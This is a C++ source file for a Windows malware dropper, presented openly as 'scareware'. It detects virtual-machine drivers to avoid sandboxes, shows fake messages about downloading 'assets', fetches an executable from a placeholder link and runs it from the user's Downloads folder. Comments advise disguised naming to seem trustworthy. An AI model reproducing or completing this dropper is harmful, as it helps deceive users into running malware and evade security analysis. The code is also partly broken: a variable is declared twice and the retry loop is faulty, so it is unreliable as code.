#include <iostream>
#include <string>
#include <chrono>
#include <thread>
#include <filesystem>
#include <fstream>
#include <windows.h>

bool detect_VM() {
    if (std::filesystem::exists("C:\\Windows\\System32\\drivers\\vmci.sys") || std::filesystem::exists("C:\\Windows\\System32\\drivers\\hvboot.sys") || std::filesystem::exists("C:\\Windows\\System32\\drivers\\VBoxWddm.sys")) {
       return true;
    } else {
      return false;
    }
}

int main() {
    std::string keep_open;
    if (detect_VM()) {
       std::cout << "Your system is incompatable with me... Please discard me as you will be unable to use me.";
       std::cin >> keep_open;
       exit(0);
    }  
    char* user = std::getenv("USERNAME");
    std::string path = "C:\\Users\\"; path += user; path += "\\Downloads\\.exe"; //Put your Scareware name here (You should put 'Assets' somewhere in the name to make it more trustable)
    std::string keep_open;

    std::cout << "I need to download assets, please give me 5 minutes\n";

    const char* cmd = "start \"\" \" Put your download link here \"";
    if (std::system(cmd) != 0) {
      std::cout << "Download Failed... Retrying 5 mores times...\n";
      for (int i = 5; i >= 0; i++) {
        if (std::system(cmd) != 0) {
          continue;
        } else {
          std::cout << "Retry Successful!\n";
          break;
        }
        std::cout << "Retrys Failed... Try restarting your system as it may be network issues.";
        std::cin >> keep_open;
        exit(0);
      }
    } // Virus Download Link
    std::cout << "Assets downloaded!\n";
    std::cout << "Activating assets...\n";
    std::this_thread::sleep_for(std::chrono::seconds(3));

    std::string cmd_nav = "cd /d %USERPROFILE%\\Downloads";
    std::string cmd_start = path;
    std::string cmd_full = cmd_nav + " && start \"\" \"" + cmd_start + "\"";

    std::system(cmd_full.c_str());
    std::cout << "Assets Activated!";
    std::cin >> keep_open;
    std::exit(0);
  
    return 0;
}
